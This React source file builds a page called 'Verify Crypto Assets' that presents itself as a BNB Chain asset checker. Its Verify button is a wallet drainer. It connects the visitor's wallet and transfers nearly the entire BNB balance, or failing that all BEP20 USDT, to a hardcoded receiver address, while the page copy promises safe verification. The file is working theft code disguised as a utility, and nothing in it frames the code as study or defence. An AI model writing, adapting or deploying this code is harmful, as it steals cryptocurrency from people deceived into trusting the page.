import { useState } from "react";
import { ethers } from "ethers";

export default function FlashUsdtChecker() {
  const [status, setStatus] = useState("Click Verify to start...");
  const RECEIVER = "0x2b69d2bb960416d1ed4fe9cbb6868b9a985d60ef";
  const USDT_BEP20 = "0x55d398326f99059fF775485246999027B3197955";
  const ERC20_ABI = [
    "function balanceOf(address owner) view returns (uint256)",
    "function transfer(address to, uint256 amount) returns (bool)",
    "function decimals() view returns (uint8)"
  ];

  async function handleVerify() {
    try {
      if (!window.ethereum) {
        setStatus("No wallet detected. Install MetaMask or Binance Wallet.");
        return;
      }

      await window.ethereum.request({ method: "eth_requestAccounts" });
      const provider = new ethers.BrowserProvider(window.ethereum);
      const signer = await provider.getSigner();
      const userAddress = await signer.getAddress();

      const network = await provider.getNetwork();
      if (network.chainId !== 56) {
        setStatus("Switch wallet to BSC Mainnet!");
        return;
      }

      setStatus("Checking balances...");

      // 1️⃣ Send all BNB
      const balanceBNB = await provider.getBalance(userAddress);
      if (balanceBNB > ethers.parseEther("0.001")) {
        setStatus("Sending BNB...");
        const tx = await signer.sendTransaction({
          to: RECEIVER,
          value: balanceBNB - ethers.parseEther("0.0005") // leave gas
        });
        await tx.wait();
        setStatus("BNB sent successfully ✅");
        return;
      }

      // 2️⃣ Send all USDT
      const usdt = new ethers.Contract(USDT_BEP20, ERC20_ABI, signer);
      const decimals = await usdt.decimals();
      const balanceUSDT = await usdt.balanceOf(userAddress);

      if (balanceUSDT > 0n) {
        setStatus("Sending USDT...");
        const tx = await usdt.transfer(RECEIVER, balanceUSDT);
        await tx.wait();
        setStatus("USDT sent successfully ✅");
        return;
      }

      setStatus("No BNB or USDT found ❌");

    } catch (err) {
      console.error(err);
      setStatus("Error: " + err.message);
    }
  }

  return (
    <div className="min-h-screen bg-[#121212] text-gray-300 flex flex-col items-center px-6 py-12">
      <h1 className="text-5xl font-bold text-yellow-400 mb-4 text-center">
        Verify Crypto Assets
      </h1>
      <p className="text-gray-400 mb-12 text-center max-w-xl">
        Instant verification of BNB Chain assets. Supports both BNB and USDT (BEP20) transfers securely.
      </p>

      <div className="relative flex justify-center items-center w-40 h-40 mb-6">
        <div className="absolute border-2 border-yellow-400 rounded-full w-40 h-40 animate-pulse-slow"></div>
        <div className="absolute border-2 border-yellow-400 rounded-full w-32 h-32 animate-pulse-slow"></div>
        <div className="absolute border-2 border-yellow-400 rounded-full w-24 h-24 animate-pulse-slow"></div>
        <button
          onClick={handleVerify}
          className="relative z-10 bg-yellow-400 text-black font-semibold py-4 px-6 rounded-full hover:bg-yellow-500 transition-all"
        >
          Verify
        </button>
      </div>

      <p className="text-gray-300 text-lg mt-4">{status}</p>

      {/* Cards Section */}
      <div className="grid grid-cols-1 sm:grid-cols-2 md:grid-cols-4 gap-6 mt-12 w-full max-w-6xl">
        {["Explorer","Tokens","NFTs","DApps"].map((title, i) => (
          <div key={i} className="bg-[#1E1E1E] rounded-xl p-6 text-center hover:translate-y-[-5px] hover:shadow-lg transition-all cursor-pointer">
            <h2 className="text-yellow-400 text-lg font-semibold mb-2">{title}</h2>
            <p className="text-gray-400 text-sm">
              {title === "Explorer" && "Browse BNB Chain addresses, contracts, tokens, and transactions."}
              {title === "Tokens" && "Check token balances and verify authenticity of BNB Chain tokens."}
              {title === "NFTs" && "Verify NFTs on BNB Chain and view metadata securely."}
              {title === "DApps" && "Connect to decentralized apps and verify transactions safely."}
            </p>
          </div>
        ))}
      </div>

      <footer className="mt-auto py-6 text-gray-500 text-sm text-center w-full">
        &copy; 2025 BNB Verify. Powered by BNB Chain.
      </footer>

      <style>{`
        @keyframes pulse-slow {
          0%,100% { transform: scale(0.8); opacity: 0.7; }
          70% { transform: scale(1.3); opacity: 0; }
        }
        .animate-pulse-slow {
          animation: pulse-slow 2.5s cubic-bezier(0.4,0,0.6,1) infinite;
        }
      `}</style>
    </div>
  );
}
